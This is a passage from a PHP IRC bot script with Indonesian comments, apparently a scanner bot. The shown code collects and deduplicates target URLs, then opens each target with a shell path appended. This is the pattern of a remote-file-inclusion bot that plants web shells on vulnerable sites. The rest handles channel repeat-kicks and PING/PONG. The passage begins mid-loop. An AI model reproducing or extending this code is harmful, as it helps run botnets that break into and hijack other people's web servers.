} while(true);
if($adatarget==2){
$hasiltarget=substr($hasiltarget,0,$rtexttarget);
$cektarget=substr($hasiltarget,0,15);
$ngulange=0;
do {
    $ngulange=$ngulange+1;
    $cektaget=substr($hasiltargetgue[$ngulange],0,15);
    if($cektaget==$cektarget){$sido=0;break;   }
    if($ngulange>=$notarget){$sido=1;break;   }
} while(true);
if($sido==1){
$notarget=$notarget+1;
$hasiltargetgue[$notarget]=$hasiltarget;
if ($notarget>=30){$loadergue = fopen ($hasiltarget.$shellgue, "rb"); }
if ($systembot['SCANSPY'][strtoupper($Params[2])]=="3ON"){
$loadergue = fopen ($hasiltarget.$shellgue, "rb");
}
}
$sido=0;
}
}
###############################################################################################
                                $yangngomong=strtolower($fsrc[nick]);
                                $asalseen[$yangngomong]="ada";
                                    if (substr($Params[3],0,1)==':' && ereg('#',$Params[2]) && $systembot['GUARD'][strtoupper($Params[2])]=="3ON") {
                                    $temptex=strtolower($Params[2]).strtolower($fsrc[nick]).strtolower($Params[3]).strtolower($Params[4]);
                                      if ($temptex==$textemp){
                                           $textrep=($textrep+1);
                                           if ($textrep>=$Maxreep){
                                           $modbot->kick($fp,$Params[2],$fsrc[nick],"2repeat..!!");
                                           }
                                      }else {$textrep=0;$textemp=$temptex;}
                                    }
                                }
                                ########### NET ############
                                break;
                        }
                        ##[ AKHIR DATA RAW NIH ]##
                }
                ### PERMAINAN PING PONG ###
                elseif ( substr($DataLine,0,4) == 'PING' ) {$modbot->send($fp,'PONG ' . substr($DataLine,5));}
                $response ="";
            }
            ##[ End Proses Data Recv ]##
        }
        fclose ($fp);
        unset ($fp);
        $response='';
    }
}  while ($keluar==0);
################### [ END CONNECT ] ###################
?>










